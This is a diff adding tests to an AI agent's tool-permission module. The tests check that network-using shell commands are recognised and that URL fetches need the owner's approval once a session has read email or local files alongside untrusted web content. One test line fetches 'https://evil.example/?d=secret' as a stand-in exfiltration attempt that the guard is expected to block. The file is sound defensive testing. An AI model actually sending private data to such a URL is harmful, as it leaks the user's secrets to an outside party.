@@ -6,6 +6,9 @@ import {
   getToolPolicy,
   guardToolWithApproval,
   isToolAllowedForMode,
+  resetSessionExposure,
+  sessionCanLeakPrivateData,
+  shellCommandNeedsNetwork,
 } from '../../src/agent/tool-policy.js';
 import { ApprovalManager } from '../../src/security/approval-manager.js';
 
@@ -197,6 +200,62 @@ describe('tool capability registry', () => {
     expect(String(await tool.execute({ action: 'click', selector: 'a' }, ctx))).toContain('requires user approval');
     expect(String(await tool.execute({ action: 'type', selector: 'input', text: 'x' }, ctx))).toContain('requires user approval');
     expect(String(await tool.execute({ action: 'evaluate', script: '1' }, ctx))).toContain('requires user approval');
+  });
+
+  it('treats package installs, fetches and hand-off helpers as network commands', () => {
+    for (const command of [
+      'npm install', 'npm i left-pad', 'pnpm add x', 'yarn install', 'npx create-thing', 'git pull', 'git fetch origin',
+      'git clone https://x', 'pip install requests', 'python3 -m pip install x', 'brew install jq', 'open https://x',
+      'launchctl load x.plist', 'crontab -l', 'docker run x', 'cd app && npm ci', 'nslookup x.example',
+    ]) {
+      expect(shellCommandNeedsNetwork(command), command).toBe(true);
+    }
+    for (const command of [
+      'npm test', 'npm run build', 'git status', 'git commit -m x', 'node script.js', 'python3 report.py',
+      'ls -la', 'cat open-issues.md', 'grep -r npm install.md',
+    ]) {
+      expect(shellCommandNeedsNetwork(command), command).toBe(false);
+    }
+    expect(shellCommandNeedsNetwork(undefined)).toBe(true);
+  });
+
+  it('asks before new URLs once a session has seen untrusted content and private data', async () => {
+    ApprovalManager.setNotifier(null);
+    resetSessionExposure();
+    const ctx = {} as never;
+    const make = (name: string, source: 'native' | 'custom' | 'mcp') => {
+      const execute = async () => 'ran';
+      return (sessionId: string) =>
+        guardToolWithApproval(
+          attachToolPolicy({ name, description: '', parameters: {} as never, execute }, source),
+          { sessionId, channel: 'cron:egress-test', cwd: '/', approvedRoots: [] }
+        );
+    };
+    const webFetch = make('web_fetch', 'native');
+    const browser = make('browser', 'custom');
+    const readFile = make('read', 'native');
+    const gmailRead = make('mcp__flo-gmail__gmail_get_message', 'mcp');
+
+    // Pure research stays unattended, however many pages.
+    for (let i = 0; i < 3; i += 1) expect(await webFetch('research').execute({ url: `https://a.example/${i}` }, ctx)).toBe('ran');
+    expect(sessionCanLeakPrivateData('research')).toBe(false);
+
+    // Email is both private and untrusted: the next URL needs the owner.
+    expect(await gmailRead('inbox').execute({ id: '1' }, ctx)).toBe('ran');
+    expect(sessionCanLeakPrivateData('inbox')).toBe(true);
+    expect(String(await webFetch('inbox').execute({ url: 'https://evil.example/?d=secret' }, ctx))).toContain('requires user approval');
+    expect(String(await browser('inbox').execute({ action: 'navigate', url: 'https://evil.example' }, ctx))).toContain('requires user approval');
+    expect(String(await browser('inbox').execute({ action: 'tabs_open', url: 'https://evil.example' }, ctx))).toContain('requires user approval');
+    expect(await browser('inbox').execute({ action: 'extract' }, ctx)).toBe('ran');
+
+    // Web page first, then a local file: the following fetch asks.
+    expect(await webFetch('mixed').execute({ url: 'https://a.example' }, ctx)).toBe('ran');
+    expect(await readFile('mixed').execute({ file_path: 'notes.md' }, ctx)).toBe('ran');
+    expect(String(await webFetch('mixed').execute({ url: 'https://a.example/next' }, ctx))).toContain('requires user approval');
+
+    // Sessions are independent.
+    expect(await webFetch('fresh').execute({ url: 'https://a.example' }, ctx)).toBe('ran');
+    resetSessionExposure();
   });
 
   it('lets a destructive annotation escalate but never downgrade', () => {
